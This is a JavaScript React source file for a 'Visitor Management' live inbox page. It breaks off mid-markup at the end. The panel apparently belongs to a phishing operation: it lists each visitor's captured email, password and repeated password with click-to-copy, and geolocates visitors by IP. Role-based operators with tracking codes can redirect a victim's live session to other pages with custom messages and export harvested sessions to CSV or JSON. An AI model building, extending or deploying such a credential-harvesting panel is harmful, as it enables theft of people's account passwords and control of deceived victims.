import React, { useState, useEffect, useRef, useCallback } from "react";
import api from "./api";
import { useAuth, useInbox } from "./AuthContext";
import io from "socket.io-client";

const SOCKET_URL = import.meta.env.VITE_API_URL || "http://localhost:5000";

// Time ago helper – always counts up
const timeAgo = (d) => {
  if (!d) return "—";
  const diff = Math.floor((Date.now() - new Date(d).getTime()) / 1000);
  if (diff < 0) return "Just now";
  if (diff < 10) return "Just now";
  if (diff < 60) return diff + "s ago";
  const m = Math.floor(diff / 60);
  if (m < 60) return m + "m ago";
  const h = Math.floor(m / 60);
  if (h < 24) return h + "h ago";
  const days = Math.floor(h / 24);
  if (days < 7) return days + "d ago";
  const w = Math.floor(days / 7);
  if (w < 4) return w + "w ago";
  return Math.floor(days / 30) + "mo ago";
};

const Avatar = ({ name, profilePic, size = 26 }) => {
  const colors = ["#3b82f6","#10b981","#f59e0b","#ef4444","#8b5cf6","#ec4899","#06b6d4","#f97316"];
  const initial = (name || "?").charAt(0).toUpperCase();
  const ci = initial.charCodeAt(0) % colors.length;
  if (profilePic) return <img src={profilePic} alt="" style={{ width: size, height: size, borderRadius: "50%", objectFit: "cover", border: "2px solid var(--card-border)", flexShrink: 0 }} onError={(e) => { e.target.style.display = "none"; }} />;
  return <div style={{ width: size, height: size, borderRadius: "50%", background: colors[ci], display: "flex", alignItems: "center", justifyContent: "center", color: "#fff", fontWeight: 700, fontSize: size * 0.4, flexShrink: 0 }}>{initial}</div>;
};

const RoleBadge = ({ role }) => {
  const m = { admin: { bg: "var(--purple-bg)", color: "var(--purple)", label: "Adm" }, moderator: { bg: "var(--warning-bg)", color: "var(--warning)", label: "Mod" }, user: { bg: "rgba(107,114,128,0.12)", color: "#6b7280", label: "Usr" } };
  const s = m[role] || m.user;
  return <span style={{ padding: "3px 7px", borderRadius: 4, fontSize: 10, fontWeight: 700, background: s.bg, color: s.color, whiteSpace: "nowrap", display: "inline-block" }}>{s.label}</span>;
};

const countryCache = {};
const CountryFlag = ({ ip }) => {
  const [flag, setFlag] = useState(null);
  useEffect(() => {
    if (!ip || ip === "::1" || ip === "127.0.0.1" || ip.startsWith("192.168.") || ip.startsWith("10.")) return;
    if (countryCache[ip]) { setFlag(countryCache[ip]); return; }
    fetch(`https://api.country.is/${ip}`).then(r => r.json()).then(data => { if (data.country) { countryCache[ip] = `https://flagcdn.com/w40/${data.country.toLowerCase()}.png`; setFlag(countryCache[ip]); } }).catch(() => {});
  }, [ip]);
  return flag ? <img src={flag} alt="" style={{ width: 22, height: 15, borderRadius: 2, flexShrink: 0 }} /> : <div style={{ width: 22, height: 15, borderRadius: 2, background: "var(--bg-secondary)", flexShrink: 0 }} />;
};

const CountBox = ({ stats }) => (
  <div style={{ display: "grid", gridTemplateColumns: "repeat(5, 1fr)", gap: 10, marginBottom: 12 }}>
    {[{ color: "var(--stat-live)", value: stats.live, label: "Live" },{ color: "var(--stat-mobile)", value: stats.mobile, label: "Mobile" },{ color: "var(--stat-desktop)", value: stats.desktop, label: "Desktop" },{ color: "var(--stat-submissions)", value: stats.submissions, label: "Subs" },{ color: "var(--stat-unique)", value: stats.unique, label: "Unique" }].map((s, i) => (
      <div key={i} style={{ background: "var(--card-bg)", borderRadius: 10, padding: "16px 8px", textAlign: "center", border: "1px solid var(--card-border)", boxShadow: "var(--card-shadow)" }}>
        <div style={{ fontSize: 24, fontWeight: 800, color: s.color }}>{s.value}</div>
        <div style={{ fontSize: 10, color: "var(--text-muted)", marginTop: 2, fontWeight: 600, textTransform: "uppercase", letterSpacing: "0.05em" }}>{s.label}</div>
      </div>
    ))}
  </div>
);

const getClientIcons = (browser, deviceType) => {
  const ua = (browser || "").toLowerCase();
  let b = "🌐";
  if (ua.includes("chrome") && !ua.includes("edg")) b = "🔵";
  else if (ua.includes("firefox")) b = "🦊";
  else if (ua.includes("safari") && !ua.includes("chrome")) b = "🧭";
  else if (ua.includes("edg")) b = "🌊";
  else if (ua.includes("opera") || ua.includes("opr")) b = "🔴";
  return { device: deviceType === "Mobile" ? "📱" : "💻", browser: b };
};

// Column widths (removed separate Status column, merged into last column)
const COL = {
  num: 42,
  flag: 54,
  client: 48,
  entry: 88,
  current: 88,
  user: 92,
  role: 50,
  email: 145,
  password: 118,
  repassword: 118,
  clicks: 65,
  more: 64,
  details: 76,
  reply: 60,
  statusTime: 82,  // combined status & time column
};

export default function LiveInboxPage() {
  const { user } = useAuth();
  const { setIsInboxPage, playSound, sessionCache, unseenSessionIds, markSessionSeen } = useInbox();
  const isAdmin = user?.role === "admin";
  const isModerator = user?.role === "moderator";
  const userCode = user?.trackingCode || "";

  const [sessions, setSessions] = useState([]);
  const [allLinks, setAllLinks] = useState([]);
  const [allUsers, setAllUsers] = useState([]);
  const [personalStats, setPersonalStats] = useState({ live:0, mobile:0, desktop:0, submissions:0, unique:0 });
  const [allStats, setAllStats] = useState({ live:0, mobile:0, desktop:0, submissions:0, unique:0 });
  const [modStats, setModStats] = useState({ live:0, mobile:0, desktop:0, submissions:0, unique:0 });
  const [expanded, setExpanded] = useState(null);
  const [activeTab, setActiveTab] = useState({});
  const [loading, setLoading] = useState(true);
  const [clearing, setClearing] = useState(false);
  const [showDownloadMenu, setShowDownloadMenu] = useState(false);
  const [showExtra, setShowExtra] = useState(false);
  const [currentPage, setCurrentPage] = useState(1);
  const [totalPages, setTotalPages] = useState(1);
  const [totalSessions, setTotalSessions] = useState(0);
  const [messageTexts, setMessageTexts] = useState({});
  const perPage = 25;
  const [showCategoryModal, setShowCategoryModal] = useState(false);
  const [quickSid, setQuickSid] = useState(null);
  const [quickMsg, setQuickMsg] = useState("");
  const [selectedCategory, setSelectedCategory] = useState("");
  const [showInfoModal, setShowInfoModal] = useState(false);
  const [infoSession, setInfoSession] = useState(null);

  const [seenClicksMap, setSeenClicksMap] = useState(() => {
    try { return JSON.parse(localStorage.getItem('seenClicksMap') || '{}'); } catch(e) { return {}; }
  });

  const prevSessionsCount = useRef(0);
  const prevSubmissionsTotal = useRef(0);
  const prevClicksTotal = useRef(0);
  const prevClicksMap = useRef({});
  const isFirstLoad = useRef(true);
  const pollingRef = useRef(null);
  const clearTimerRef = useRef(null);
  const socketRef = useRef(null);
  const timeTickRef = useRef(null);
  const [, setTick] = useState(0);

  const setFilterMessage = (k, v) => setMessageTexts(p => ({ ...p, [k]: v }));
  const getFilterMessage = (k) => messageTexts[k] || "";

  const getUserInfo = useCallback((tc) => {
    if (!tc) return { name: "?", role: "user", profilePic: null, isMe: false };
    if (tc === userCode) return { name: "Me", role: user?.role || "user", profilePic: user?.profilePic || null, isMe: true };
    const found = allUsers.find(u => u.trackingCode === tc);
    if (found) return { name: found.name || found.username || tc, role: found.role || "user", profilePic: found.profilePic || null, isMe: false };
    return { name: tc, role: "user", profilePic: null, isMe: false };
  }, [userCode, allUsers, user]);

  const getEntryCategory = (s, linksList) => {
    if (!s || !linksList.length) return "—";
    if (s.baseCode) { const f = linksList.find(x => x.baseCode === s.baseCode); if (f) return f.category || "—"; }
    return "—";
  };

  const getCurrentCategory = (s, linksList) => {
    if (!s || !linksList.length) return "—";
    if (s.baseCode) { const f = linksList.find(x => x.baseCode === s.baseCode); if (f) return f.category || "—"; }
    return "—";
  };

  const loadLinks = useCallback(() => { api.get("/links").then(r => setAllLinks(r.data || [])).catch(() => {}); }, []);
  const loadAllUsers = useCallback(() => { api.get("/admin/users").then(r => setAllUsers(r.data.users || [])).catch(() => {}); }, []);

  const actionLinks = allLinks.filter(l => (l.linkType === "action" || l.linkType === "both") && (l.showInInbox !== false || l.inboxView === "message" || l.linksCategory === "message"));
  const quickActionLinks = actionLinks.filter(l => l.inboxView !== "message" && l.linksCategory !== "message" && l.inboxAction !== "message");
  const allCategories = [...new Set(quickActionLinks.map(l => l.category).filter(Boolean))].sort().filter(c => c !== "message");
  const messageLinks = actionLinks.filter(l => l.inboxView === "message" || l.linksCategory === "message" || l.inboxAction === "message");

  useEffect(() => {
    const socket = io(SOCKET_URL, { transports: ['websocket', 'polling'] });
    socketRef.current = socket;
    socket.on('connect', () => { if (user?._id) socket.emit('joinUserRoom', user._id); });
    socket.on('sessionsUpdated', () => loadAll(true));
    socket.on('linkCreated', () => loadLinks());
    return () => socket.disconnect();
  }, [user]);

  // Timer tick to refresh the "time ago" display every second
  useEffect(() => {
    timeTickRef.current = setInterval(() => setTick(t => t + 1), 1000);
    return () => clearInterval(timeTickRef.current);
  }, []);

  const getModCodes = useCallback(() => {
    if (!isModerator) return [];
    const codes = [userCode];
    allUsers.filter(u => u.parentId === user?._id).forEach(u => { if (u.trackingCode) codes.push(u.trackingCode); });
    return codes;
  }, [isModerator, userCode, allUsers, user]);

  const loadAll = useCallback((skipSound = false) => {
    const params = new URLSearchParams(); params.append("page", currentPage); params.append("limit", perPage);
    api.get("/sessions?" + params.toString()).then(r => {
      const data = r.data.sessions || []; const newTotal = r.data.total || data.length;
      const newSubTotal = data.reduce((sum, s) => sum + (s.submissions || []).length, 0);
      const newClicksTotal = data.reduce((sum, s) => sum + (s.clicks || 0), 0);
      if (!isFirstLoad.current && !skipSound) {
        if (newTotal > prevSessionsCount.current) playSound("click");
        if (newSubTotal > prevSubmissionsTotal.current) playSound("submit");
        if (newClicksTotal > prevClicksTotal.current) playSound("click");
      }
      data.forEach(s => { prevClicksMap.current[s._id] = s.clicks || 0; });
      prevSessionsCount.current = newTotal; prevSubmissionsTotal.current = newSubTotal; prevClicksTotal.current = newClicksTotal;
      // Always sort newest first so new activity jumps to top
      data.sort((a, b) => new Date(b.lastActivity || b.timestamp) - new Date(a.lastActivity || a.timestamp));
      setSessions(data); setTotalSessions(newTotal); setTotalPages(r.data.totalPages || 1);
      const calcStats = (arr) => ({
        live: arr.filter(s => s.isLive).length,
        mobile: arr.filter(s => s.deviceType === "Mobile").length,
        desktop: arr.filter(s => s.deviceType === "Desktop").length,
        submissions: arr.reduce((sum, s) => sum + (s.submissions || []).length, 0),
        unique: new Set(arr.map(s => s.visitorId)).size
      });
      const myData = data.filter(s => s.trackingCode === userCode);
      setPersonalStats(calcStats(myData)); setAllStats(calcStats(data));
      if (isModerator) { const modCodes = getModCodes(); const modData = data.filter(s => modCodes.includes(s.trackingCode)); setModStats(calcStats(modData)); }
      if (isFirstLoad.current) isFirstLoad.current = false;
      setLoading(false);
    }).catch(() => setLoading(false));
  }, [currentPage, perPage, playSound, userCode, isModerator, getModCodes]);

  const startPolling = useCallback(() => {
    if (pollingRef.current) clearInterval(pollingRef.current);
    pollingRef.current = setInterval(() => loadAll(false), 5000);
  }, [loadAll]);

  const stopPolling = useCallback(() => {
    if (pollingRef.current) { clearInterval(pollingRef.current); pollingRef.current = null; }
  }, []);

  useEffect(() => { setIsInboxPage(true); return () => setIsInboxPage(false); }, [setIsInboxPage]);
  useEffect(() => { if (sessionCache.current.length > 0 && sessions.length === 0) { setSessions(sessionCache.current.slice(0, perPage)); setTotalSessions(sessionCache.current.length); setLoading(false); } }, []);
  useEffect(() => { loadAll(true); loadLinks(); loadAllUsers(); startPolling(); return () => stopPolling(); }, []);
  useEffect(() => { if (!isFirstLoad.current) loadAll(true); }, [currentPage]);
  useEffect(() => { localStorage.setItem('seenClicksMap', JSON.stringify(seenClicksMap)); }, [seenClicksMap]);

  const markClickSeen = (sessionId) => setSeenClicksMap(prev => ({ ...prev, [sessionId]: prevClicksMap.current[sessionId] || 0 }));
  const hasNewClick = (s) => (s.clicks || 0) > (seenClicksMap[s._id] || 0);

  const handleClearAll = () => {
    if (!window.confirm(isAdmin ? "Delete ALL sessions permanently?" : "Clear your personal sessions?")) return;
    setClearing(true); stopPolling(); if (clearTimerRef.current) clearTimeout(clearTimerRef.current);
    api.delete("/sessions/clear/all").then(() => {
      setSessions([]); setTotalSessions(0); setTotalPages(1); setCurrentPage(1);
      setPersonalStats({ live:0, mobile:0, desktop:0, submissions:0, unique:0 });
      setAllStats({ live:0, mobile:0, desktop:0, submissions:0, unique:0 });
      setModStats({ live:0, mobile:0, desktop:0, submissions:0, unique:0 });
      setExpanded(null); setActiveTab({}); setSeenClicksMap({});
      prevSessionsCount.current = 0; prevSubmissionsTotal.current = 0; prevClicksTotal.current = 0; prevClicksMap.current = {};
      clearTimerRef.current = setTimeout(() => { setClearing(false); startPolling(); loadAll(true); }, 3000);
    }).catch(() => { setClearing(false); startPolling(); });
  };

  const handleDownload = (format) => {
    setShowDownloadMenu(false); if (!sessions.length) return;
    if (format === "json") {
      const a = document.createElement("a");
      a.href = URL.createObjectURL(new Blob([JSON.stringify(sessions, null, 2)]));
      a.download = "sessions_" + new Date().toISOString().slice(0, 10) + ".json"; a.click();
    } else {
      const hd = ["visitorId","trackingCode","entryUrl","deviceType","status","ip","browser","clicks","timestamp","lastActivity"];
      const rw = sessions.map(s => [s.visitorId||"",s.trackingCode||"",s.entryUrl||"",s.deviceType||"",s.status||"",s.ip||"",(s.browser||"").replace(/,/g," "),s.clicks||0,s.timestamp||"",s.lastActivity||""].join(","));
      const a = document.createElement("a");
      a.href = URL.createObjectURL(new Blob([hd.join(",")+"\n"+rw.join("\n")], { type: "text/csv" }));
      a.download = "sessions_" + new Date().toISOString().slice(0, 10) + ".csv"; a.click();
    }
  };

  const toggleExpand = (id) => { setExpanded(expanded === id ? null : id); if (!activeTab[id]) setActiveTab(p => ({ ...p, [id]: "transfer" })); };
  const setTab = (id, tab) => setActiveTab(p => ({ ...p, [id]: tab }));

  const quickSend = async (sid, url, msg) => { if (!sid || !url) return; try { await api.post("/sessions/" + sid + "/redirect-new", { targetUrl: url, message: msg || "" }); loadAll(true); } catch (e) {} };
  const getVisitorActionUrl = (l) => { const base = (l.baseUrl || "").replace(/\/$/, ""); const bc = l.baseCode || l.slug || ""; const vid = sessions.find(s => s._id === (expanded || ''))?.visitorId || ''; return base + "/" + userCode + "_" + bc + (vid ? "?vid=" + vid : ""); };
  const tabs = [{ key: "transfer", label: "Transfer" },{ key: "tracking", label: "Submissions" }];
  const openInfoModal = (session) => { setInfoSession(session); setShowInfoModal(true); };

  const handleReplyEmail = (email) => {
    if (!email || email === "—") return;
    window.open(`https://mail.google.com/mail/?view=cm&fs=1&to=${encodeURIComponent(email)}`, '_blank');
  };

  const renderExpandedContent = (tab, session, entryUrl) => {
    const sid = session._id, msg = getFilterMessage('');
    const getTargetUrl = (l) => { const tc = userCode; const bc = l.baseCode || l.slug || ""; const vid = sessions.find(s => s._id === sid)?.visitorId || ''; return (l.baseUrl || "").replace(/\/$/, "") + "/" + tc + (bc ? "_" + bc : "") + (vid ? "?vid=" + vid : ""); };
    if (tab === "transfer") {
      return (<div style={{ display: "flex", flexDirection: "column", gap: 12, padding: 12 }}>
        {allCategories.length > 0 && (<div><div style={sLabel}>Quick Actions</div><div style={{ display: "grid", gridTemplateColumns: `repeat(${Math.min(allCategories.length, 5)}, 1fr)`, gap: 5 }}>{allCategories.map(cat => { const catLinks = quickActionLinks.filter(l => l.category === cat && l.showInInbox !== false); if (catLinks.length === 0) return null; return (<button key={cat} onClick={() => { setQuickSid(sid); setQuickMsg(msg); setSelectedCategory(cat); setShowCategoryModal(true); }} style={{ padding: "12px 7px", fontSize: 11, fontWeight: 700, background: "#6366f1", color: "#fff", border: "none", borderRadius: 6, cursor: "pointer", whiteSpace: "nowrap", overflow: "hidden", textOverflow: "ellipsis", width: "100%" }}>{cat} ({catLinks.length})</button>); })}</div></div>)}
        <div><div style={sLabel}>Message & Send</div><div style={{ display: "flex", gap: 8, alignItems: "stretch" }}><div style={{ width: "25%", minWidth: 140 }}><textarea placeholder="Type message..." value={msg} onChange={(e) => setFilterMessage('', e.target.value)} style={{ width: "100%", height: "48px", padding: "10px 12px", fontSize: 12, background: "var(--input-bg)", color: "var(--text)", border: "1px solid var(--input-border)", borderRadius: 6, outline: "none", resize: "none", fontFamily: "inherit" }} /></div><div style={{ flex: 1 }}>{messageLinks.length > 0 ? (<div style={{ display: "grid", gridTemplateColumns: "repeat(5, 1fr)", gap: 5 }}>{messageLinks.map(l => (<button key={l._id} onClick={() => quickSend(sid, getTargetUrl(l), msg)} style={{ padding: "12px 5px", fontSize: 10, fontWeight: 600, background: "#ec4899", color: "#fff", border: "none", borderRadius: 6, cursor: "pointer" }}>{l.name}</button>))}</div>) : (<div style={{ color: "var(--text-muted)", fontSize: 10, padding: 14, textAlign: "center", background: "var(--bg-secondary)", borderRadius: 6, border: "1px solid var(--card-border)" }}>No message links. Add from Link Hub.</div>)}</div></div></div>
      </div>);
    }
    if (tab === "tracking") {
      const submissions = session.submissions || [];
      const firstThree = {};
      const extraCards = [];
      submissions.forEach((sub, si) => {
        if (sub) {
          Object.keys(sub).forEach(key => {
            if (key === "submittedAt" || key === "step") return;
            if (!firstThree[key]) { firstThree[key] = { key, value: sub[key], subIndex: si }; }
            else { extraCards.push({ key, value: sub[key], subIndex: si }); }
          });
        }
      });
      if (Object.keys(firstThree).length === 0 && session.formData) {
        try { const fdKeys = Object.keys(session.formData); fdKeys.forEach(key => { if (!firstThree[key]) firstThree[key] = { key, value: session.formData[key], subIndex: 0 }; }); } catch(e) {}
      }
      const mainCards = Object.values(firstThree);
      return (<div style={{ padding: 8 }}>
        {mainCards.length === 0 && <div style={{ color: "var(--text-muted)", fontSize: 11, textAlign: "center", padding: 18 }}>No submissions yet</div>}
        {mainCards.length > 0 && (
          <>
            <div style={{ display: "grid", gridTemplateColumns: "repeat(auto-fill, minmax(140px, 1fr))", gap: 5, marginBottom: extraCards.length > 0 ? 8 : 0 }}>
              {mainCards.map((card, idx) => (
                <div key={idx} onClick={() => { if(card.value) navigator.clipboard.writeText(String(card.value)); }} style={{ background: "var(--bg-secondary)", padding: "8px 10px", borderRadius: 6, border: "1px solid var(--card-border)", cursor: "pointer" }}>
                  <div style={{ fontSize: 9, color: "var(--text-muted)", marginBottom: 3, textTransform: "uppercase", fontWeight: 600 }}>{card.key}</div>
                  <div style={{ fontSize: 12, color: "var(--text)", fontWeight: 500, wordBreak: "break-all", maxHeight: 18, overflow: "hidden" }}>{card.value}</div>
                </div>
              ))}
            </div>
            {extraCards.length > 0 && (
              <div>
                <div style={{ fontSize: 8, color: "var(--accent)", marginBottom: 5, fontWeight: 600, textTransform: "uppercase", letterSpacing: "0.04em" }}>More ({extraCards.length})</div>
                <div style={{ display: "grid", gridTemplateColumns: "repeat(auto-fill, minmax(140px, 1fr))", gap: 4 }}>
                  {extraCards.map((card, idx) => (
                    <div key={idx} onClick={() => { if(card.value) navigator.clipboard.writeText(String(card.value)); }} style={{ background: "var(--bg-secondary)", padding: "7px 9px", borderRadius: 5, border: "1px solid var(--card-border)", cursor: "pointer", opacity: 0.82 }}>
                      <div style={{ fontSize: 8, color: "var(--text-muted)", marginBottom: 2, textTransform: "uppercase", fontWeight: 600 }}>{card.key}{card.subIndex > 0 ? ` #${card.subIndex + 1}` : ""}</div>
                      <div style={{ fontSize: 10, color: "var(--text)", fontWeight: 500, wordBreak: "break-all", maxHeight: 14, overflow: "hidden" }}>{card.value}</div>
                    </div>
                  ))}
                </div>
              </div>
            )}
          </>
        )}
      </div>);
    }
    return <div style={{ color: "var(--text-muted)", textAlign: "center", padding: 18, fontSize: 11 }}>Select a tab</div>;
  };

  const EmptyState = () => (<div style={{ textAlign: "center", padding: 70, color: "var(--text-muted)" }}><div style={{ width: 48, height: 48, border: "3px solid var(--card-border)", borderTop: "3px solid var(--accent)", borderRadius: "50%", margin: "0 auto 16px", animation: "spin 1s linear infinite" }} /><div style={{ fontSize: 16, fontWeight: 500 }}>Waiting for visitors...</div></div>);
  const getSecondaryLabel = () => { if (isAdmin) return "All Users"; if (isModerator) return "My Team"; return "All Users"; };
  const getSecondaryStats = () => isModerator ? modStats : allStats;

  if (loading) return <div style={{ padding: 14 }}><h2 style={{ fontSize: 22, margin: "0 0 4px" }}>🔷 Visitor Management</h2><EmptyState /></div>;
  if (sessions.length === 0 && !clearing) return (
    <div style={{ padding: 14 }}>
      <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", flexWrap: "wrap", gap: 6, marginBottom: 8 }}><div><h2 style={{ margin: 0, fontSize: 22 }}>🔷 Visitor Management</h2><p style={{ margin: 0, fontSize: 12, color: "var(--text-muted)" }}>Manage All Visitor Sessions · Real-time</p></div><div style={{ display: "flex", gap: 4, alignItems: "center" }}><button onClick={handleClearAll} disabled style={{ padding: "8px 14px", fontSize: 11, fontWeight: 600, opacity: 0.5, background: "var(--danger)", color: "#fff", border: "none", borderRadius: 5 }}>Clear</button><button disabled style={{ padding: "8px 14px", fontSize: 11, fontWeight: 600, opacity: 0.5, background: "transparent", color: "var(--text)", border: "1px solid var(--card-border)", borderRadius: 5 }}>⬇</button></div></div>
      <div style={{ fontSize: 11, fontWeight: 700, color: "var(--accent)", textTransform: "uppercase", letterSpacing: "0.06em", marginBottom: 6 }}>📊 My Sessions</div><CountBox stats={personalStats} /><EmptyState />
    </div>
  );

  return (
    <div style={{ padding: 14 }}>
      <style>{`
        @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
        @keyframes pulse{0%,100%{opacity:1}50%{opacity:0.4}}
        .ir:hover td{background:var(--table-hover)!important}
        .it{width:100%;table-layout:fixed;border-collapse:collapse;border-spacing:0}
        .it th,.it td{padding:0 5px;margin:0;overflow:hidden;vertical-align:middle;border-right:1px solid var(--table-border);border-bottom:1px solid var(--table-border);box-sizing:border-box}
        .it th:last-child,.it td:last-child{border-right:none}
        .clip{display:block;overflow:hidden;text-overflow:ellipsis;whiteSpace:nowrap;width:100%}
        .fld{width:100%;height:34px;padding:0 7px;background:var(--input-bg);border:1px solid var(--input-border);border-radius:4px;font-size:12px;color:var(--text);overflow-x:hidden;overflow-y:hidden;whiteSpace:nowrap;box-sizing:border-box;display:flex;align-items:center;scrollbar-width:none;cursor:pointer}
        .fld::-webkit-scrollbar{height:0px;width:0px}
        .fld.empty{color:var(--text-muted);font-style:italic;cursor:default}
        .refresh-btn{background:transparent;border:1px solid var(--card-border);color:var(--text-muted);cursor:pointer;font-size:17px;padding:3px 7px;border-radius:4px;flex-shrink:0;display:inline-flex;align-items:center;justify-content:center;height:34px;min-width:34px;transition:all 0.15s}
        .refresh-btn:hover{background:var(--menu-hover-bg);color:var(--accent);border-color:var(--accent)}
      `}</style>

      <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", flexWrap: "wrap", gap: 6, marginBottom: 8 }}>
        <div><h2 style={{ margin: 0, fontSize: 22, fontWeight: 700 }}>🔷 Visitor Management</h2><p style={{ margin: "1px 0 0", fontSize: 12, color: "var(--text-muted)" }}>Manage All Visitor Sessions · {totalSessions} sessions</p></div>
        <div style={{ display: "flex", gap: 4, alignItems: "center" }}>
          <button onClick={handleClearAll} disabled={clearing || sessions.length === 0} style={{ padding: "8px 14px", fontSize: 11, fontWeight: 600, background: "var(--danger)", color: "#fff", border: "none", borderRadius: 5, cursor: sessions.length === 0 ? "not-allowed" : "pointer", opacity: sessions.length === 0 ? 0.5 : 1 }}>{clearing ? "Clearing..." : "Clear"}</button>
          <div style={{ position: "relative" }}><button onClick={() => setShowDownloadMenu(!showDownloadMenu)} disabled={sessions.length === 0} style={{ padding: "8px 14px", fontSize: 11, fontWeight: 600, background: "transparent", color: "var(--accent)", border: "1px solid var(--accent)", borderRadius: 5, cursor: sessions.length === 0 ? "not-allowed" : "pointer", opacity: sessions.length === 0 ? 0.5 : 1 }}>⬇</button>
            {showDownloadMenu && <div style={{ position: "absolute", top: "100%", right: 0, marginTop: 3, background: "var(--card-bg)", border: "1px solid var(--card-border)", borderRadius: 5, padding: 2, minWidth: 120, zIndex: 200, boxShadow: "0 6px 16px rgba(0,0,0,0.3)" }}><button onClick={() => handleDownload("json")} style={{ display: "block", width: "100%", padding: "7px 12px", background: "transparent", border: "none", color: "var(--text)", fontSize: 11, cursor: "pointer", textAlign: "left", borderRadius: 3 }}>📄 JSON</button><button onClick={() => handleDownload("csv")} style={{ display: "block", width: "100%", padding: "7px 12px", background: "transparent", border: "none", color: "var(--text)", fontSize: 11, cursor: "pointer", textAlign: "left", borderRadius: 3 }}>📊 CSV</button></div>}
          </div>
        </div>
      </div>

      <div style={{ fontSize: 11, fontWeight: 700, color: "var(--accent)", textTransform: "uppercase", letterSpacing: "0.06em", marginBottom: 6 }}>📊 My Sessions</div>
      <CountBox stats={personalStats} />

      <div style={{ marginBottom: 4 }}>
        <div onClick={() => setShowExtra(!showExtra)} style={{ display: "flex", alignItems: "center", justifyContent: "flex-end", gap: 5, cursor: "pointer", userSelect: "none", padding: "1px 0" }}>
          <span style={{ fontSize: 11, fontWeight: 700, color: "var(--accent)", textTransform: "uppercase" }}>{getSecondaryLabel()}</span>
          <span style={{ fontSize: 11, color: showExtra ? "var(--accent)" : "var(--text-muted)" }}>{showExtra ? "▲" : "▼"}</span>
        </div>
        <div style={{ overflow: "hidden", maxHeight: showExtra ? "320px" : "0px", opacity: showExtra ? 1 : 0, transition: "max-height 0.3s ease, opacity 0.2s ease" }}>
          {showExtra && <CountBox stats={getSecondaryStats()} />}
        </div>
      </div>

      {clearing && <div style={{ textAlign: "center", padding: 12, margin: "6px 0", color: "var(--success)", fontWeight: 600, fontSize: 13, background: "rgba(74,222,128,0.1)", borderRadius: 6 }}>✅ Cleared! Refreshing...</div>}

      {!clearing && (
        <div style={{ background: "var(--card-bg)", borderRadius: 10, border: "1px solid var(--card-border)", overflow: "hidden", boxShadow: "var(--card-shadow)" }}>
          <div style={{ overflowX: "auto" }}>
            <table className="it">
              <colgroup>
                <col style={{ width: COL.num + "px" }} />
                <col style={{ width: COL.flag + "px" }} />
                <col style={{ width: COL.client + "px" }} />
                <col style={{ width: COL.entry + "px" }} />
                <col style={{ width: COL.current + "px" }} />
                <col style={{ width: COL.user + "px" }} />
                <col style={{ width: COL.role + "px" }} />
                <col style={{ width: COL.email + "px" }} />
                <col style={{ width: COL.password + "px" }} />
                <col style={{ width: COL.repassword + "px" }} />
                <col style={{ width: COL.clicks + "px" }} />
                <col style={{ width: COL.more + "px" }} />
                <col style={{ width: COL.details + "px" }} />
                <col style={{ width: COL.reply + "px" }} />
                <col style={{ width: COL.statusTime + "px" }} />
              </colgroup>
              <thead>
                <tr style={{ background: "var(--table-header-bg)", borderBottom: "2px solid var(--table-border)", height: 46 }}>
                  <th style={thS}>#</th>
                  <th style={thS}>Flag</th>
                  <th style={thS}>Client</th>
                  <th style={{ ...thS, textAlign: "left" }}>Entry</th>
                  <th style={{ ...thS, textAlign: "left" }}>Current</th>
                  <th style={{ ...thS, textAlign: "left" }}>User</th>
                  <th style={thS}>Role</th>
                  <th style={{ ...thS, textAlign: "left" }}>Email</th>
                  <th style={{ ...thS, textAlign: "left" }}>Password</th>
                  <th style={{ ...thS, textAlign: "left" }}>Re-Password</th>
                  <th style={thS}>Clicks</th>
                  <th style={thS}>More</th>
                  <th style={thS}>Actions</th>
                  <th style={thS}>Reply</th>
                  <th style={{ ...thS, textAlign: "center" }}>Activity</th>
                </tr>
              </thead>
              <tbody>
                {sessions.map((s, i) => {
                  const ui = getUserInfo(s.trackingCode);
                  const en = getEntryCategory(s, allLinks);
                  const cn = getCurrentCategory(s, allLinks);
                  const { device, browser: bIcon } = getClientIcons(s.browser, s.deviceType);
                  const fd = s.formData || {};
                  const emailVal = fd.email || "";
                  const passVal = fd.password || "";
                  const rePassVal = fd.rePassword || fd.confirmPassword || "";
                  const clkCount = s.clicks || 0;
                  const rn = (currentPage - 1) * perPage + i + 1;
                  const isExp = expanded === s._id;
                  const showNewBadge = hasNewClick(s);
                  const isLive = s.isLive;
                  const lastActivity = s.lastActivity || s.timestamp;
                  return (
                    <React.Fragment key={s._id || i}>
                      <tr className="ir" onClick={() => { markSessionSeen(s._id); markClickSeen(s._id); }} style={{ borderBottom: "1px solid var(--table-border)", height: 50, transition: "background 0.1s", cursor: "pointer" }}>
                        <td style={{ ...tdS, textAlign: "center", color: "var(--text-muted)", fontSize: 12, fontWeight: 700, position: "relative" }}>
                          {rn}
                          {unseenSessionIds.includes(s._id) && (<span style={{ position: "absolute", top: 3, right: 3, background: "#ef4444", color: "#fff", borderRadius: 3, padding: "1px 4px", fontSize: 8, fontWeight: 700, lineHeight: 1.2 }}>NEW</span>)}
                        </td>
                        <td style={{ ...tdS, textAlign: "center" }}><CountryFlag ip={s.ip} /></td>
                        <td style={{ ...tdS, textAlign: "center", fontSize: 18 }}>{device}{bIcon}</td>
                        <td style={{ ...tdS, textAlign: "left" }} title={en}><span className="clip" style={{ fontSize: 12, color: "var(--accent)", fontWeight: 600 }}>{en}</span></td>
                        <td style={{ ...tdS, textAlign: "left" }} title={cn}><span className="clip" style={{ fontSize: 12, color: s.status === "Redirected" ? "#f59e0b" : "var(--text-muted)", fontWeight: 500 }}>{cn}</span></td>
                        <td style={{ ...tdS, textAlign: "left" }}><div style={{ display: "flex", alignItems: "center", gap: 5, width: "100%", overflow: "hidden" }}>{!ui.isMe && <Avatar name={ui.name} profilePic={ui.profilePic} size={22} />}<span className="clip" style={{ flex: 1, minWidth: 0, fontSize: 12, fontWeight: ui.isMe ? 700 : 500, color: ui.isMe ? "var(--accent)" : "var(--text)" }}>{ui.name}</span></div></td>
                        <td style={{ ...tdS, textAlign: "center" }}><RoleBadge role={ui.role} /></td>
                        <td style={{ ...tdS, textAlign: "left", paddingTop: 1, paddingBottom: 1 }}>
                          <div style={{ display: "flex", gap: 4, alignItems: "center" }}>
                            <div className={`fld${!emailVal ? " empty" : ""}`} title={emailVal || "No email"} onClick={(e) => { e.stopPropagation(); if(emailVal) navigator.clipboard.writeText(emailVal); }} style={{ flex: 1 }}>{emailVal || "—"}</div>
